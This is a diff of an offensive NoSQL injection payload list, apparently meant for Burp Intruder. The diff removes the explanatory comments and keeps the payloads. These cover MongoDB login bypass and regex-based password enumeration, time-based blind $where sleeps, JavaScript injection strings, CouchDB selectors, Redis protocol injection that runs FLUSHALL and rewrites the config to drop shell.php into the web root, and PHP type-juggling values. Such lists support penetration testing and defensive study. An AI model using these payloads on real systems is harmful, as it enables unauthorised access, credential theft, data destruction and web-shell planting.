@@ -1,7 +1,5 @@
 # ============================================================
 # NoSQL Injection Payloads
-# Targets: MongoDB, CouchDB, Redis, Cassandra
-# Use: Burp Intruder, manual in JSON/form body
 # ============================================================
 
 # ---- MongoDB — Authentication Bypass (JSON body) ----
@@ -36,14 +34,13 @@ username[$exists]=true&password[$exists]=true
 {"username": "admin", "password": {"$regex": "^b"}}
 {"username": "admin", "password": {"$regex": "^pa"}}
 {"username": "admin", "password": {"$regex": "^pas"}}
-# Automate: iterate chars to bruteforce password
 
-# ---- MongoDB — $where Time-Based Blind ----
+# ---- MongoDB — Time-Based Blind ----
 {"$where": "sleep(5000) || 1==1"}
 {"$where": "function(){if(this.password.match(/^a/)){sleep(5000)};return true;}"}
 {"$where": "if(this.username=='admin'){sleep(5000)}"}
 
-# ---- MongoDB — JS Injection (when $where enabled) ----
+# ---- MongoDB — JS Injection ----
 ';return 'a'=='a' && ''=='
 ';return 'a'=='b' && ''=='
 ' || 'a'=='a
@@ -59,14 +56,13 @@ $where: '1 == 1'
 {"selector": {"$or": [{"username": "admin"}, {"username": "administrator"}]}}
 
 # ---- Redis (via HTTP) ----
-# If app passes unsanitized input to Redis commands:
 \r\nFLUSHALL\r\n
 \r\nCONFIG SET dir /var/www/html\r\n
 \r\nCONFIG SET dbfilename shell.php\r\n
 *1\r\n$8\r\nFLUSHALL\r\n
 *3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$4\r\ntest\r\n
 
-# ---- PHP Type Juggling (common with NoSQL/JSON) ----
+# ---- PHP Type Juggling ----
 {"password": true}
 {"password": []}
 {"password": {}}
